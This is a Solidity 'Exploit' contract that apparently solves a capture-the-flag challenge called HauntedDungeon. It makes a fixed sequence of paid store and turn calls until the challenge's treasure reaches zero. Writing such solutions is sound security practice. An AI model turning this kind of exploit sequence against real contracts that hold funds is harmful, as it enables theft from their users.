pragma solidity 0.8.4;

import "./HauntedDungeon.sol";

contract Exploit {
    HauntedDungeon challenge;

    constructor(address _challenge) payable {
        challenge = HauntedDungeon(_challenge);
    }

    function finalize() public {
        challenge.enterDungeon{value: 0.1 ether}();
        challenge.store{value: 0.2 ether}("mntnDew");
        challenge.turn();
        challenge.store{value: 0.2 ether}("mntnDew");
        challenge.turn();
        challenge.store{value: 0.2 ether}("mntnDew");
        challenge.turn();
        challenge.store{value: 0.2 ether}("mntnDew");
        challenge.turn();
        challenge.store{value: 0.2 ether}("mntnDew"); //20
        challenge.store{value: 0.6 ether}("lifePotion");
        challenge.store{value: 0.2 ether}("mntnDew"); //30
        challenge.store{value: 0.2 ether}("mntnDew"); //40
        challenge.store{value: 0.6 ether}("lifePotion");
        challenge.store{value: 0.2 ether}("mntnDew"); //50
        challenge.store{value: 0.2 ether}("mntnDew"); //60
        challenge.turn();
        challenge.turn();
        require(challenge.treasure() == 0, "not a winning function call");
    }

    fallback() external payable {}
}
